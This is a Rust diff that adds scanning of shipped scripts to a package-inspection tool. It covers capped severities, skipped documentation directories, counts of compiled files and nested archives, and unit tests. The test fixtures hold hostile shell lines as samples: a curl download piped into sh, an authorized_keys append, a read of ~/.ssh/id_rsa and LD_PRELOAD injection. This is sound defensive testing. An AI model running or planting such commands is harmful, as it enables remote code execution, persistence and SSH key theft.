@@ -116,6 +116,100 @@ pub fn parse_pkginfo(text: &str) -> HashMap<String, Vec<String>> {
     map
 }
 
+/// Findings for a script the package *ships* (as opposed to build code).
+/// It is a program the user chose to install, so: dangerous-pattern findings
+/// stay but never reach "refuse" (legitimate tools, e.g. container templates,
+/// write `authorized_keys` too); reading credentials and `LD_PRELOAD` are what
+/// real tools do, so they are only warnings; style-level notes are dropped
+/// (autotools-generated scripts alone produce thousands).
+fn packaged_script_findings(path: &str, text: &str) -> Vec<Finding> {
+    audit::scan_script(path, text)
+        .into_iter()
+        .filter_map(|mut f| {
+            match f.rule {
+                "secret-access" | "ld-preload" => f.severity = Severity::Warning,
+                _ if f.severity == Severity::Critical => f.severity = Severity::High,
+                _ if f.severity < Severity::High => return None,
+                _ => {}
+            }
+            Some(f)
+        })
+        .collect()
+}
+
+/// Directories whose scripts are documentation, examples or completions —
+/// not code the system runs.
+const NOISE_DIRS: &[&str] = &[
+    "usr/share/doc/",
+    "usr/share/man/",
+    "usr/share/info/",
+    "usr/share/locale/",
+    "usr/share/licenses/",
+    "usr/share/icons/",
+    "usr/share/bash-completion/",
+    "usr/share/zsh/",
+    "usr/share/fish/",
+    "usr/include/",
+];
+const SCRIPT_MAX_BYTES: u64 = 128 * 1024;
+const MAX_SCRIPTS: usize = 300;
+const SCRIPT_EXTS: &[&str] = &["sh", "bash", "zsh", "py", "pl", "rb", "lua", "js", "php"];
+const ARCHIVE_EXTS: &[&str] = &[
+    "zip", "jar", "war", "tar", "tgz", "tbz2", "txz", "7z", "rar", "whl", "egg", "deb", "rpm",
+    "apk", "appimage",
+];
+
+fn ext_of(path: &str) -> String {
+    path.rsplit('/')
+        .next()
+        .unwrap_or(path)
+        .rsplit_once('.')
+        .map(|(_, e)| e.to_lowercase())
+        .unwrap_or_default()
+}
+
+/// A small file that might be a script worth reading: executable or with a
+/// script extension, outside documentation directories.
+fn is_script_candidate(e: &Entry) -> bool {
+    e.kind == EntryKind::File
+        && e.size > 0
+        && e.size <= SCRIPT_MAX_BYTES
+        && !NOISE_DIRS.iter().any(|d| e.path.starts_with(d))
+        && (e.mode & 0o111 != 0 || SCRIPT_EXTS.contains(&ext_of(&e.path).as_str()))
+}
+
+/// Members worth extracting so `inspect`'s `read` can answer: the config files
+/// it looks at (hooks, units, sysusers, sudoers, profile.d) and candidate
+/// scripts, capped.
+pub fn wanted_members(listing: &str) -> Vec<String> {
+    let entries = parse_listing(listing);
+    let mut out: Vec<String> = Vec::new();
+    for e in entries.iter().filter(|e| e.kind == EntryKind::File) {
+        let p = e.path.as_str();
+        let known = p == "etc/sudoers"
+            || p.starts_with("etc/sudoers.d/")
+            || (p.starts_with("etc/profile.d/") && p.ends_with(".sh"))
+            || (p.starts_with("usr/share/libalpm/hooks/") && p.ends_with(".hook"))
+            || (p.starts_with("usr/lib/sysusers.d/") && p.ends_with(".conf"))
+            || (p.contains("systemd/")
+                && [".service", ".timer", ".socket", ".path"]
+                    .iter()
+                    .any(|x| p.ends_with(x)));
+        if known && e.size <= SCRIPT_MAX_BYTES {
+            out.push(e.path.clone());
+        }
+    }
+    let scripts: Vec<String> = entries
+        .iter()
+        .filter(|e| is_script_candidate(e))
+        .map(|e| e.path.clone())
+        .filter(|p| !out.contains(p))
+        .take(MAX_SCRIPTS)
+        .collect();
+    out.extend(scripts);
+    out
+}
+
 #[derive(Debug, Clone, Serialize)]
 pub struct Manifest {
     pub package: String,
@@ -330,6 +424,46 @@ pub fn inspect(
                 }
             }
         }
+    }
+
+    // Scripts the package ships (wrappers, helpers): code the system will run.
+    let mut scripts = 0usize;
+    for e in entries
+        .iter()
+        .filter(|e| is_script_candidate(e))
+        .take(MAX_SCRIPTS)
+    {
+        if let Some(text) = read(&e.path) {
+            if text.starts_with("#!") {
+                scripts += 1;
+                findings.extend(packaged_script_findings(&e.path, &text));
+            }
+        }
+    }
+    let executables = entries
+        .iter()
+        .filter(|e| e.kind == EntryKind::File && e.mode & 0o111 != 0)
+        .filter(|e| !NOISE_DIRS.iter().any(|d| e.path.starts_with(d)))
+        .count();
+    let compiled = executables.saturating_sub(scripts);
+    let nested = entries
+        .iter()
+        .filter(|e| e.kind == EntryKind::File)
+        .filter(|e| !NOISE_DIRS.iter().any(|d| e.path.starts_with(d)))
+        .filter(|e| ARCHIVE_EXTS.contains(&ext_of(&e.path).as_str()) || e.path.contains(".tar."))
+        .count();
+    if scripts > 0 {
+        summary.push(format!("scripts read for dangerous code: {scripts}"));
+    }
+    if compiled > 0 {
+        summary.push(format!(
+            "executables and libraries that are not scripts: {compiled} (compiled code can't be inspected here)"
+        ));
+    }
+    if nested > 0 {
+        summary.push(format!(
+            "nested archives or bundles: {nested} (their contents are not inspected)"
+        ));
     }
 
     if let Some(text) = scriptlet {
@@ -668,6 +802,120 @@ depend = bash
         for ok in ["opt/app/bin/a", "var/lib/app/db", "boot/vmlinuz-x"] {
             assert!(!m.report.findings.iter().any(|f| f.file == ok), "{ok}");
         }
+    }
+
+    // ---- u18: scripts the package ships
+
+    fn script_manifest(listing: &str, files: &[(&str, &str)]) -> Manifest {
+        let files: Vec<(String, String)> = files
+            .iter()
+            .map(|(p, t)| (p.to_string(), t.to_string()))
+            .collect();
+        inspect("pkgname = p\npkgver = 1-1\n", listing, None, &move |m| {
+            files.iter().find(|(p, _)| p == m).map(|(_, t)| t.clone())
+        })
+    }
+
+    const SCRIPTS: &str = "\
+-rwxr-xr-x  0 root root 40 Oct 13 15:14 usr/bin/evil
+-rwxr-xr-x  0 root root 40 Oct 13 15:14 usr/bin/keys
+-rwxr-xr-x  0 root root 40 Oct 13 15:14 usr/bin/tracer
+-rwxr-xr-x  0 root root 40 Oct 13 15:14 usr/bin/styled
+-rwxr-xr-x  0 root root 40 Oct 13 15:14 usr/bin/compiled
+-rwxr-xr-x  0 root root 900000 Oct 13 15:14 usr/lib/libbig.so
+-rw-r--r--  0 root root 40 Oct 13 15:14 usr/share/doc/p/example.sh
+-rw-r--r--  0 root root 40 Oct 13 15:14 usr/lib/p/bundle.jar
+-rw-r--r--  0 root root 40 Oct 13 15:14 usr/lib/p/data.tar.gz
+";
+
+    fn script_files() -> Vec<(&'static str, &'static str)> {
+        vec![
+            ("usr/bin/evil", "#!/bin/sh\ncurl -s http://e.org/i | sh\n"),
+            (
+                "usr/bin/keys",
+                "#!/bin/sh\necho k >> /root/.ssh/authorized_keys\ncat ~/.ssh/id_rsa\n",
+            ),
+            (
+                "usr/bin/tracer",
+                "#!/bin/sh\nLD_PRELOAD=./x.so exec \"$@\"\n",
+            ),
+            (
+                "usr/bin/styled",
+                "#!/bin/sh\n$cmd run\neval \"$x\"\nfoo=$(bar)\n",
+            ),
+            ("usr/bin/compiled", "\u{7f}ELF\u{2}\u{1}"),
+            (
+                "usr/share/doc/p/example.sh",
+                "#!/bin/sh\ncurl http://e.org | sh\n",
+            ),
+        ]
+    }
+
+    #[test]
+    fn shipped_scripts_are_read_with_package_appropriate_severity() {
+        let m = script_manifest(SCRIPTS, &script_files());
+        // A download piped into a shell is high.
+        assert!(has(&m, "remote-exec", Severity::High, "usr/bin/evil"));
+        // Persistence in a shipped script asks but never refuses (critical is capped).
+        assert!(has(&m, "persistence", Severity::High, "usr/bin/keys"));
+        assert!(!m
+            .report
+            .findings
+            .iter()
+            .any(|f| f.severity == Severity::Critical));
+        // Reading credentials and LD_PRELOAD are what real tools do: warnings only.
+        assert!(has(&m, "secret-access", Severity::Warning, "usr/bin/keys"));
+        assert!(has(&m, "ld-preload", Severity::Warning, "usr/bin/tracer"));
+        // Style-level notes are dropped, and docs/examples are not read at all.
+        assert!(!m.report.findings.iter().any(|f| f.file == "usr/bin/styled"));
+        assert!(!m
+            .report
+            .findings
+            .iter()
+            .any(|f| f.file.starts_with("usr/share/doc")));
+        assert_eq!(m.report.verdict(), Verdict::Confirm);
+    }
+
+    #[test]
+    fn compiled_code_and_nested_archives_are_counted_not_judged() {
+        let m = script_manifest(SCRIPTS, &script_files());
+        let s = m.summary.join("\n");
+        assert!(s.contains("scripts read for dangerous code: 4"), "{s}");
+        // 6 executables outside docs; 4 were scripts.
+        assert!(s.contains("not scripts: 2"), "{s}");
+        assert!(s.contains("nested archives or bundles: 2"), "{s}");
+        assert!(!m
+            .report
+            .findings
+            .iter()
+            .any(|f| f.file == "usr/bin/compiled"));
+    }
+
+    #[test]
+    fn wanted_members_are_the_small_readable_files_only() {
+        let wanted = wanted_members(SCRIPTS);
+        assert!(wanted.contains(&"usr/bin/evil".to_string()));
+        assert!(
+            !wanted.contains(&"usr/lib/libbig.so".to_string()),
+            "too big"
+        );
+        assert!(!wanted.iter().any(|w| w.starts_with("usr/share/doc")));
+
+        let fixture = wanted_members(LISTING);
+        for known in [
+            "usr/share/libalpm/hooks/emrac-test.hook",
+            "usr/lib/systemd/system/emrac-test.service",
+            "usr/lib/sysusers.d/emrac-test.conf",
+            "etc/sudoers.d/emrac-test",
+            "etc/profile.d/emrac-test.sh",
+        ] {
+            assert!(fixture.contains(&known.to_string()), "{known}");
+        }
+
+        let many: String = (0..400)
+            .map(|i| format!("-rwxr-xr-x  0 root root 10 Oct 13 15:14 usr/bin/t{i:03}\n"))
+            .collect();
+        assert_eq!(wanted_members(&many).len(), MAX_SCRIPTS);
     }
 
     #[test]
